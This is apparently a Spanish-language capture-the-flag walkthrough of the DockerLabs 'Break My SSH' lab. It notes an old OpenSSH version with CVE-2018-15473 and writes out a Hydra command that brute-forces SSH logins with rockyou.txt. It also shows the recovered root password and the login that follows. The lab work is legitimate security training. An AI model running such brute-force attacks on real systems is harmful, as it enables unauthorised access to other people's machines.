
# 🐳 [Break My SSH]

| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | DockerLabs |
| **Dificultad** | 🟢 Muy Fácil  |
| **OS** | Linux  |
| **IP de la Máquina** | `172.17.0.2` |
| **Fecha de resolución** | 2026-09-29 |

---

## 📝 Descripción

---

## 🔍 1. Fase de Reconocimiento y Enumeración

Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:
<img width="1638" height="247" alt="1Escaneo" src="https://github.com/user-attachments/assets/5726fba1-8bb5-4769-a206-4f2c4ba2c4ce" />


Solo tiene abierto el puerto 22 SSH, realizamos un escaneo más profundo del puerto encontrado.

<img width="1312" height="311" alt="2Escaneopuerto" src="https://github.com/user-attachments/assets/adc97929-4167-4c56-803f-9d083881e5cb" />
Usa la versión 7.7 publicada en 2018, por lo que tiene alguna vulnerabilidad como la CVE-2018-15473 que permite a un atacante remoto saber si un nombre de usuario existe o no en el sistema mediante la diferencia en el tiempo de respuesta o el manejo de paquetes de autenticación inválidos.

---

## 💥 2. Fase de Explotación 

Vamos a lanzar la herramienta Hydra con una lista de usuarios y el diccionario rockyou.txt para las contraseñas:
```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/rockyou.txt ssh://172.17.0.2 -s 22 -t 15
```

<img width="1920" height="249" alt="3Hydra" src="https://github.com/user-attachments/assets/2c9b0046-fd5d-46de-ad79-25a5246a178c" />
Enseguida nos encuentra las credenciales correctas.

```
[22][ssh] host: 172.17.0.2   login: root   password: estrella
```

---

## 👑 3. Escalada de Privilegios

Ahora solo tenemos que conectarnos por SSH con las credenciales descubiertas y hemos resuelto la máquina.
<img width="1120" height="403" alt="Fin" src="https://github.com/user-attachments/assets/c0db21ce-a0ff-408a-ae13-91500b5b7cde" />
